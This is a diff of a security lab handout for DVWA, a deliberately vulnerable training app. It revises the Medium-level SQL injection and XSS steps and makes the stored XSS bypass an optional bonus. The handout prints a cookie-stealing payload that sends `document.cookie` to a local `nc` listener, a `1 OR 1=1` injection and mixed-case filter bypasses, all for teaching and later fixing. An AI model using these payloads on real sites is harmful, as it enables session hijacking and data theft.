@@ -161,7 +161,7 @@ When the guestbook reloads, the stored script runs in Firefox and sends the cook
 **In the report:** a reflected XSS printing the cookie (screenshot) and a stored XSS sending it to your `nc` (screenshot with your ID visible).
 
 ### 1.3 Raise the bar
-Medium adds filters, but each one protects only the exact pattern its developer expected. Test all three cases:
+Medium adds filters, but each one protects only the exact pattern its developer expected. Steps 1–3 are required; step 4 is an optional bonus:
 
 1. Open **DVWA Security**, choose **Medium**, click **Submit**, then return to **SQL Injection**. The text field is now a dropdown and the form sends its value with HTTP POST.
 2. Right-click the dropdown → **Inspect**. In the highlighted `<select>`, find an option such as `<option value="1">1</option>`, double-click its `value`, and change it to `1 OR 1=1`. Return to the page, select the edited option and click **Submit**.
@@ -179,7 +179,7 @@ Medium escapes quote characters, but this query places the ID into SQL without q
 
 The Medium filter removes only the exact lowercase text `<script>`. HTML tag names are case-insensitive, so Firefox still recognises `<ScRiPt>` as a script element.
 
-4. Make sure the earlier `nc` listener is stopped. Open **XSS (Stored)**, click **Clear Guestbook** and confirm the prompt; this removes the Low payload so it cannot be mistaken for a Medium bypass. Start a fresh listener with `nc -lvnp 8000`. Then right-click **Name** → **Inspect** and change `maxlength="10"` to `200`. Put `Medium <ID>` in **Message** and this mixed-case payload in **Name**, again replacing `<ID>`:
+4. **Bonus (optional).** Make sure the earlier `nc` listener is stopped. Open **XSS (Stored)**, click **Clear Guestbook** and confirm the prompt; this removes the Low payload so it cannot be mistaken for a Medium bypass. Start a fresh listener with `nc -lvnp 8000`. Then right-click **Name** → **Inspect** and change `maxlength="10"` to `200`. Put `Medium <ID>` in **Message** and this mixed-case payload in **Name**, again replacing `<ID>`:
 
 ```html
 <ScRiPt>fetch('//127.0.0.1:8000/?id=M<ID>&c='+encodeURIComponent(document.cookie))</ScRiPt>
@@ -188,14 +188,14 @@ The Medium filter removes only the exact lowercase text `<script>`. HTML tag nam
 The leading `//` reuses the page's HTTP protocol and keeps the payload short. The `M` before your ID marks this as the Medium test. The Medium Stored filter removes all tags from **Message**, but checks **Name** only for the exact lowercase `<script>` string. The mixed-case tag survives that blacklist and the browser executes it.
 
 > [!NOTE]
-> **Expected.** The reflected payload opens an alert with `security=medium`; the stored payload produces a new request at `nc` containing `id=M<ID>`, `security%3Dmedium` and `PHPSESSID%3D...`.
+> **Expected.** The reflected payload opens an alert with `security=medium`; if you did the bonus, the stored payload produces a new request at `nc` containing `id=M<ID>`, `security%3Dmedium` and `PHPSESSID%3D...`.
 
 > [!TIP]
-> **Common pitfall.** Editing `maxlength` changes only the current page. If you reload before submitting, repeat the edit. For SQL injection, select the option whose `value` you changed before clicking **Submit**.
+> **Common pitfall.** Editing `maxlength` changes only the current page. If you reload before submitting, repeat the edit. For SQL injection, select the option whose `value` you changed before clicking **Submit**. In the bonus, the database stores at most 100 characters of **Name**, so paste the payload exactly, without extra spaces; a longer value makes DVWA fail with `Data too long`.
 
 Medium has not removed the vulnerability; it has only blacklisted a few strings. Case changes and a different input field bypass those assumptions. Part 2 fixes the boundary itself so the same input remains data.
 
-**In the report:** screenshots of the Medium SQLi result and both Medium XSS results, plus 3–5 sentences explaining what each filter tried to block and why the bypass worked.
+**In the report:** screenshots of the Medium SQLi and Medium reflected XSS results (plus the stored XSS if you did the bonus), and 3–5 sentences explaining what each filter tried to block and why the bypass worked.
 
 ## Part 2 — Defensive: fix the code · ~30 min
 
@@ -216,6 +216,7 @@ The **Impossible** level in *Compare All Levels* is DVWA's own correct version �
 3 concrete secure-development recommendations (parameterized queries everywhere, context-aware output encoding, CSP, least privilege for the DB user).
 
 ### Bonus
+- Stored XSS on **Medium** (1.3, step 4).
 - Automate 1.1 with `sqlmap` (`-u` + the session cookie) and extract the table names.
 - Define a minimal CSP header that would stop your stored XSS, and explain why.
 
